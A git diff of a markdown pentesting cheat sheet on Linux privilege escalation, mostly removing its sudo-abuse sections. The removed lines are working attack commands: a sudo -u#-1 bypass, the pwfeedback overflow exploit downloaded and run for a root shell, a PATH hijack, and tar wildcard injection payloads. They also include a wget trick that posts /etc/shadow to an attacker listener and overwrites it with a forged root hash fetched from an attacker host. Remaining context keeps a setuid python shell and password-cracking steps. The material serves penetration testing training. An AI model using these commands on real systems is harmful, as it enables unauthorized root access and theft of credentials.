@@ -2,7 +2,7 @@
 title: Linux Privilege Escalation
 desc: 
 tags: [Cron, Linux, Mount, PrivEsc, Privilege, RCE, Reverse, Shell, Vim]
-alts: [DNS-Pentesting, Docker-Pentesting, Reverse-Shell, Windows-Priviles-Escalation]
+alts: [DNS-Pentesting, Docker-Pentesting, Reverse-Shell, Sudo-PrivEsc, Windows-Priviles-Escalation]
 render_with_liquid: false
 ---
 
@@ -50,102 +50,7 @@ render_with_liquid: false
     echo $2
     ```
 
-3. **Sudo Bypass**
-
-    1. **Check Properties**
-
-        ```sh
-        sudo -l
-        sudo -ll
-
-        # Specify hostname
-        sudo -h <host-name> -l
-        # Execute via the hostname
-        sudo -h <host-name> /bin/bash
-        ```
-
-    2. **No Reasons Why You Don't**
-
-        If you can execute 'su' command as root privilege, you can switch to root.
-
-        ```sh
-        sudo su root
-
-        # Other user
-        sudo -u john whoami
-        ```
-
-    3. **Sudo Version <= 1.28**
-
-        ```sh
-        sudo -u#-1 /bin/bash
-        ```
-
-    4. **Sudo Buffer Overflow**
-
-        1. **Baron Samedit (Heap Buffer Overflow)**
-
-            1. **Check Vulnerability to Overwrite Heap Buffer in Target Machine**
-
-                ```sh
-                sudoedit -s '\' $(python3 -c 'print("A"*1000)')
-                ```
-
-            2. **PoC**
-
-                See **[this repository](https://github.com/lockedbyte/CVE-Exploits/tree/master/CVE-2021-3156){:target="_blank"}**.
-
-        2. **Pwfeedback**
-
-            1. **Check Enabling the Pwfeedback in /etc/sudoers**
-
-                If so, when running sudo command and inputting password, asterisk will be displayed.  
-                You can make it the buffer overflow.
-
-                ```sh
-                cat /etc/sudoers
-
-                # -------------------------------------------
-
-                ...
-                Defaults pwfeadback
-                ...
-                ```
-
-            2. **Input Long String to Password**
-
-                ```sh
-                perl -e 'print(("A" x 100 . "\x{00}") x 50)' | sudo -S id
-                # [sudo] password for tryhackme: Segmentation fault
-                ```
-
-            3. **Download a Payload and Compile in Local Machine**
-
-                ```sh
-                wget https://raw.githubusercontent.com/saleemrashid/sudo-cve-2019-18634/master/exploit.c
-                gcc -o exploit exploit.c
-                ```
-
-            4. **Transfer the Payload to Remote Machine**
-
-                ```sh
-                # In local machine
-                python3 -m http.server 8000
-
-                # In remote machine
-                wget http://<local-ip>:8000/exploit
-                ```
-
-            5. **Execute the Payload in Remote Machine**
-
-                After that, you'll get a root shell.
-
-                ```sh
-                chmod 700 ./exploit
-                ./exploit
-                ```
-
-4. **Interest Information**
+3. **Interest Information**
 
     1. **Use Common Tools**
 
@@ -232,7 +137,7 @@ render_with_liquid: false
         tcpdump -i lo -A
         ```
 
-5. **Find Sensitive Information**
+4. **Find Sensitive Information**
 
     1. **Use Find**
 
@@ -293,7 +198,7 @@ render_with_liquid: false
         ls /var/www/
         ```
 
-6. **Find SUID**
+5. **Find SUID**
 
     ```sh
     # Option 1
@@ -316,13 +221,13 @@ render_with_liquid: false
         find /root -exec ls -al {} \;
         ```
 
-7. **Find Writable Directories**
+6. **Find Writable Directories**
 
     ```sh
     find / -writable 2>/dev/null | cut -d "/" -f 2,3 | sort -u
     ```
 
-8. **Find Capabilities**
+7. **Find Capabilities**
 
     ```sh
     getcap -r / 2>/dev/null
@@ -360,7 +265,7 @@ render_with_liquid: false
         /home/<current-user>/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
         ```
 
-9. **Get Sensitive Contents in Files**
+8. **Get Sensitive Contents in Files**
 
     ```sh
     grep root ./*
@@ -377,7 +282,7 @@ render_with_liquid: false
     grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" ./*
     ```
 
-10. **Monitor Processes without Root Privileges**
+9. **Monitor Processes without Root Privileges**
 
     Using **[pspy](https://github.com/DominicBreuker/pspy){:target="_blank"}**, you can fetch processes even if you’re not root user.
 
@@ -385,7 +290,7 @@ render_with_liquid: false
     ./pspy -pf -i 1000
     ```
 
-11. **Crack User Passwords**
+10. **Crack User Passwords**
 
     If you can access **/etc/passwd** and **/etc/shadow**, crack users password using **unshadow**.
 
@@ -438,27 +343,7 @@ render_with_liquid: false
     root
     ```
 
-3. **Change Contents of Executable**
-
-    If you can execute the SUID file, change the content using "echo" and overwrite the PATH to run it with priority.
-
-    ```sh
-    # option 1
-    echo /bin/sh > /tmp/poweroff
-    # option 2
-    echo /bin/bash > /tmp/poweroff
-
-    chmod +x /tmp/poweroff
-    export PATH=/tmp:$PATH
-
-    # Some SUID command
-    sudo /usr/sbin/shutdown
-
-    # Then you are root user
-    root>
-    ```
-
-4. **Doas Command**
+3. **Doas Command**
 
     **doas** executes commands as another user. **"doas.conf"** is interesting to privilege escalation.
 
@@ -466,95 +351,6 @@ render_with_liquid: false
     doas -u root <command> <arg>
     doas -C /etc/doas.conf
     ```
-
-5. **Vim as Root Privileges**
-
-    ```sh
-    sudo vim /example.txt
-    ```
-
-    In Vim editor, run commands as root.
-
-    ```sh
-    :r!whoami
-    ```
-
-6. **Wget Abuses /etc/shadow**
-
-    Get /etc/shadow and generate a new hash passwd and set it to shadow file, then upload it. That changes the root password.
-
-    1. **Check User Privileges and Commands**
-
-        If you find that 'wget' is executable as root, you can abuse /etc/shadow and create a new root user.
-
-        ```sh
-        sudo -l
-
-        (root) NOPASSWD: /usr/bin/wget
-        ```
-
-    2. **Open Listener in Local Machine**
-
-        ```sh
-        nc -lvnp 4444
-        ```
-
-    3. **Display the Content of /etc/shadow into Local Machine**
-
-        In remote machine,
-
-        ```sh
-        sudo /usr/bin/wget --post-file=/etc/shadow <local-ip> 4444
-        ```
-
-        Then you can see the content of /etc/shadow in your local listener.
-
-    4. **Copy the Content of /etc/shadow to a New Shadow File in Your Local Machine**
-
-        ```sh
-        vim shadow.txt
-        ```
-
-    5. **Generate a New Hash Password for a New Root User in Your Local Machine**
-
-        You will create a new root user in a later section.
-
-        ```sh
-        openssl passwd -6 -salt salt password
-        ```
-
-        Copy a generated password and paste it at the root's password to shadow file.
-
-        ```sh
-        vim shadow.txt
-        ```
-
-        As a result, the contents of shadow.txt should look like this:
-
-        ```sh
-        root:$6$salt$IxDD...DCy.g.:18195:0:99999:7:::
-        ...
-        ```
-
-    6. **Start Web Server in Local Machine**
-
-        ```sh
-        python3 -m http.server 8000
-        ```
-
-    7. **Download Shadow File as /etc/shadow in Remote Machine**
-
-        Run **wget** as root privileges.
-
-        ```sh
-        sudo /usr/bin/wget http://<attacker-ip>:8000/shadow.txt -O /etc/shadow 
-        ```
-
-        You can switch to root user.
-
-        ```sh
-        su root
-        ```
 
 <br />
 
@@ -653,38 +449,6 @@ LXD is a container management extension for Linux Containers (LXC).
     ```sh
     cd /mnt/root/
     ```
-
-<br />
-
-## Wildcard Injection with Tar
-
-```sh
-# Check if there are 'tar' command and wildcard(*) in the sudoers
-sudo -l
-
-# > the output expected
-(root) NOPASSWD: /opt/backups/backup.sh
-
-# -----------------------------------------------------------------------------
-
-# Move to the directory and check the content.
-cd /opt/backups
-cat backup.sh
-
-# > the output expected
-tar cf backup.tar *
-
-# ------------------------------------------------------------------------------
-
-# Payloads
-cd /opt/backups
-echo -e '#!/bin/bash\n/bin/bash' > shell.sh
-echo "" > "--checkpoint-action=exec=sh shell.sh"
-echo "" > --checkpoint=1
-
-# Check current user
-whoami
-```
 
 <br />
 
